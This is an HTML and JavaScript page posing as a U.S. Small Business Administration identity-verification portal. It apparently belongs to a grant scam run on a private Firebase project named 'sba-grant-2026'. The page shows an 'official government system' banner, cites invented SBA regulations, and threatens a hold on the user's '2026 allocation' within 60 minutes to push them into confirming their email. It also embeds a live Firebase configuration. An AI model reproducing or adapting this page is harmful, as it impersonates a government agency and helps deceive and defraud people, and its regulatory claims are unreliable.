<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SBA Portal | Identity Verification Required</title>
    <link rel="stylesheet" href="style.css">
    <style>
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        .pulse-text { animation: pulse 2s infinite; }
        .verification-icon {
            font-size: 64px;
            margin-bottom: 25px;
            display: inline-block;
            filter: drop-shadow(0 4px 10px rgba(0,39,76,0.15));
        }
        .status-pill.approved {
            background: #ecfdf5;
            color: #065f46;
            border: 1px solid #d1fae5;
        }
        .status-pill.pending {
            background: #fff7ed;
            color: #9a3412;
            border: 1px solid #ffedd5;
        }
    </style>
</head>
<body style="background: #f1f5f9;">
    <div class="gov-banner">
        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:16px; margin-right:8px;" alt="USA Flag">
        OFFICIAL U.S. GOVERNMENT SYSTEM - SECURE 2026
    </div>

    <div class="nav" style="justify-content: center; background: #00274c; padding: 16px; display: flex;">
        <h1 style="font-size: 14px; letter-spacing: 3px; color: white; margin: 0;">SECURITY PROTOCOL</h1>
    </div>

    <div class="container">
        <div class="card" style="text-align: center; padding: 45px 24px; border-top: 6px solid #0071bc; border-radius: 14px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); margin-top: 20px;">
            
            <div id="statusPill" class="status-pill pending pulse-text" style="margin-bottom: 25px; padding: 6px 16px; display: inline-block; font-size: 12px; font-weight: bold; border-radius: 20px;">
                Awaiting Verification
            </div>

            <div class="verification-icon">ðŸ“§</div>
            
            <h2 style="color: #00274c; font-size: 22px; margin-bottom: 12px; letter-spacing: -0.5px;">Verify Your Credentials</h2>
            
            <p style="color: #64748b; font-size: 13px; line-height: 1.7; margin-bottom: 30px;">
                A secure authentication link has been dispatched to your registered email. In compliance with <b>FY2026 SBA Data Sovereignty Regulations</b>, you must verify your address to unlock your allocation.
            </p>

            <div style="background: #f0f7ff; border: 1px solid #dbeafe; padding: 20px; border-radius: 12px; font-size: 12px; color: #1e40af; margin-bottom: 30px; text-align: left; line-height: 1.6;">
                <b style="text-transform: uppercase; font-size: 10px; letter-spacing: 0.5px; display: block; margin-bottom: 10px;">Required Security Actions:</b>
                <ul style="margin: 0 0 0 18px; padding: 0; display: flex; flex-direction: column; gap: 8px;">
                    <li>Access your registered email inbox.</li>
                    <li>Open the official <b>SBA.GOV Security</b> notice.</li>
                    <li>Click the <b>"Confirm Identity"</b> button.</li>
                    <li>Check <b>Spam/Junk</b> folders if not visible.</li>
                </ul>
            </div>

            <button onclick="location.reload()" id="checkStatusBtn" style="background: #0071bc; color: white; padding: 16px; border-radius: 10px; width: 100%; font-weight: 800; border: none; text-transform: uppercase; letter-spacing: 1px; cursor: pointer; margin-bottom: 15px;">
                I've Verified - Refresh Status
            </button>
            
            <button id="logoutBtn" style="background: transparent; border: 1px solid #cbd5e1; color: #64748b; padding: 12px; width: 100%; border-radius: 8px; font-size: 11px; font-weight: 700; text-transform: uppercase; cursor: pointer;">
                Cancel & Return to Login
            </button>
            
            <p style="font-size: 11px; color: #94a3b8; margin-top: 25px;">
                Didn't receive the link? <br>
                <a href="#" id="resendBtn" style="color: #0071bc; text-decoration: none; font-weight: 800; text-transform: uppercase; font-size: 10px; display: inline-block; margin-top: 5px;">Resend Secure Link</a>
            </p>
        </div>

        <div style="text-align: center; margin-top: 30px; padding: 0 20px;">
            <p style="font-size: 10px; color: #94a3b8; line-height: 1.4;">
                <b>PRIVACY ACT NOTICE:</b> This verification link is valid for 60 minutes. Failure to verify within the allotted time will result in a temporary security hold on your 2026 allocation.
            </p>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
        import { getAuth, sendEmailVerification, onAuthStateChanged, reload, signOut } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";

        const firebaseConfig = {
            apiKey: "AIzaSyB5nOOx153po4nWh4irbmTAcxsCZaM1-9k",
            authDomain: "sba-grant-2026.firebaseapp.com",
            projectId: "sba-grant-2026",
            storageBucket: "sba-grant-2026.firebasestorage.app",
            messagingSenderId: "838430821326",
            appId: "1:838430821326:web:6438deacb334076a64f99f"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const statusPill = document.getElementById('statusPill');

        onAuthStateChanged(auth, async (user) => {
            if (user) {
                // If user is already verified, send to welcome/dashboard immediately
                if (user.emailVerified) {
                    window.location.href = 'welcome.html';
                    return;
                }

                // Check status every 3 seconds automatically
                const checkInterval = setInterval(async () => {
                    try {
                        await reload(user);
                        if (user.emailVerified) {
                            clearInterval(checkInterval);
                            statusPill.innerText = "IDENTITY VERIFIED";
                            statusPill.classList.remove('pending', 'pulse-text');
                            statusPill.classList.add('approved');
                            
                            setTimeout(() => { 
                                window.location.href = 'welcome.html'; 
                            }, 2000);
                        }
                    } catch (e) {
                        console.error("Auth reload failed", e);
                    }
                }, 3000);
            } else {
                window.location.href = 'index.html';
            }
        });

        // Resend Verification Email
        document.getElementById('resendBtn').addEventListener('click', async (e) => {
            e.preventDefault();
            const user = auth.currentUser;
            const link = e.target;
            
            if(user) {
                try {
                    await sendEmailVerification(user);
                    alert("SECURITY HANDSHAKE: A new verification link has been transmitted to your inbox.");
                    link.innerText = "LINK TRANSMITTED";
                    link.style.pointerEvents = "none";
                    link.style.color = "#94a3b8";
                } catch(err) {
                    alert("RATE LIMIT EXCEEDED: Please wait 60 seconds before requesting another secure link.");
                }
            }
        });

        // Logout
        document.getElementById('logoutBtn').addEventListener('click', () => {
            signOut(auth).then(() => {
                window.location.href = 'index.html';
            });
        });
    </script>
</body>
</html>